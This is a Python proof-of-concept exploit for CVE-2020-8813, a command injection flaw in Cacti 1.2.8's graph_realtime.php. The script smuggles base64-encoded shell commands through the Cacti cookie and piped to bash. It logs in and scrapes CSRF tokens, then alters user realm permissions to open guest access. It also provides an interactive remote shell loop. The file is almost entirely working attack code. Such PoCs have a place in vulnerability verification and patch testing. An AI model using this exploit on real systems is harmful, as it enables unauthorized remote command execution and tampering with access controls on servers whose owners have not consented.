#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : CVE-2020-8813.py
# Author             : Podalirius (@podalirius_)
# Date created       : 30 Sep 2022

import base64
import requests
import argparse
import urllib.parse
from bs4 import BeautifulSoup
import re
import readline


def cacti_rce_execute(session, target, cmd):
    cmd = bytes(cmd, 'utf-8')
    if "Cacti" in session.cookies.keys():
        # Authenticated
        payload = "%s;echo${IFS}%s|base64${IFS}-d|bash" % (session.cookies["Cacti"], base64.b64encode(cmd).decode('utf-8'))
    else:
        # Guest
        payload = ";echo${IFS}%s|base64${IFS}-d|bash" % base64.b64encode(cmd).decode('utf-8')
    r = session.get(
        target + "/graph_realtime.php?action=init",
        cookies={
            'Cacti': urllib.parse.quote(payload)
        },
        verify=False
    )
    return r.content


def can_access_as_guest(target):
    r = requests.get(
        target + "/graph_realtime.php?action=init",
        verify=False
    )
    if b"Enter your Username and Password below" in r.content:
        return False, r.url
    else:
        return True, r.url


def enable_guest_access(session, target):
    print("[>] Enabling guest access to '%s'" % (target.rstrip("/") + "/graph_realtime.php"))
    # Getting CSRF
    r = session.get(target + "/user_admin.php?action=user_edit&id=3&tab=realms")
    soup = BeautifulSoup(r.content, 'lxml')
    __csrf_magic = soup.find('input', attrs={"name":"__csrf_magic"})
    if __csrf_magic is not None:
        __csrf_magic = __csrf_magic["value"]
    else:
        matched = re.search(rb"""(var csrfMagicToken='([^']+)'|var csrfMagicToken="([^"]+)")""", r.content)
        if matched is not None:
            __csrf_magic = matched.groups()[1]

    r = session.post(
        target + "/user_admin.php?header=false",
        data={
            "id": "3",
            "section25": "on",
            "section7": "on",
            "tab": "realms",
            "save_component_realm_perms": 1,
            "action": "save",
            "__csrf_magic": __csrf_magic
        },
        verify=False
    )
    if r.status_code == 200:
        return True
    else:
        return False


def cacti_login(session, target, username, password):
    # Getting CSRF
    r = session.get(target + "/index.php")
    soup = BeautifulSoup(r.content, 'lxml')
    __csrf_magic = soup.find('input', attrs={"name":"__csrf_magic"})
    if __csrf_magic is not None:
        __csrf_magic = __csrf_magic["value"]
    else:
        matched = re.search(rb"""(var csrfMagicToken='([^']+)'|var csrfMagicToken="([^"]+)")""", r.content)
        if matched is not None:
            __csrf_magic = matched.groups()[1]
    # Login in
    r = session.post(
        target + "/index.php",
        data={
            "__csrf_magic": __csrf_magic,
            "action": "login",
            "login_username": username,
            "login_password": password
        },
        verify=False
    )
    if b"Logged in as" in r.content:
        return True
    else:
        return False


def parseArgs():
    print("PoC of CVE-2020-8813 - RCE through graph_realtime.php in Cacti 1.2.8 - by @podalirius_\n")
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-t", "--target", default=None, required=True, help='Target URL of the cacti')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    parser.add_argument("-u", "--username", default=None, required=False, help='Username to connect to Cacti')
    parser.add_argument("-p", "--password", default=None, required=False, help='Password to connect to Cacti')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-L", "--live", default=None, action="store_true", help='Live mode. (default: False)')
    group.add_argument("-c", "--command", default=None, help='Execute a single command')
    parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    if options.insecure_tls:
        # Disable warnings of insecure connection for invalid certificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    if not options.target.startswith("https://") and not options.target.startswith("http://"):
        target = "http://" + options.target
    else:
        target = options.target
    target = target.rstrip("/")

    session = requests.Session()

    print("[+] Targeting '%s' ...\n" % target)

    if options.username is None and options.password is None:
        result, url = can_access_as_guest(target)
        if result:
            print("[+] Endpoint '%s' can be accessed as guest." % url)
            if options.live is not None:
                try:
                    while True:
                        cmd = input("[shell]> ")
                        result = cacti_rce_execute(session, target, cmd)
                        print(result)
                except KeyboardInterrupt as e:
                    pass
            elif options.command is not None:
                result = cacti_rce_execute(session, target, options.command)
                print(result)
        else:
            print("[!] Endpoint '%s' cannot be accessed as guest, you need to authenticate." % url)
    else:
        logged_in = cacti_login(session, target, options.username, options.password)
        if logged_in:
            enable_guest_access(session, target)
            if options.live is not None:
                try:
                    while True:
                        cmd = input("[shell]> ")
                        result = cacti_rce_execute(session, target, cmd)
                        print(result)
                except KeyboardInterrupt as e:
                    pass
            elif options.command is not None:
                result = cacti_rce_execute(session, target, options.command)
                print(result)
        else:
            print("[!] Could not login to Cacti with these credentials.")
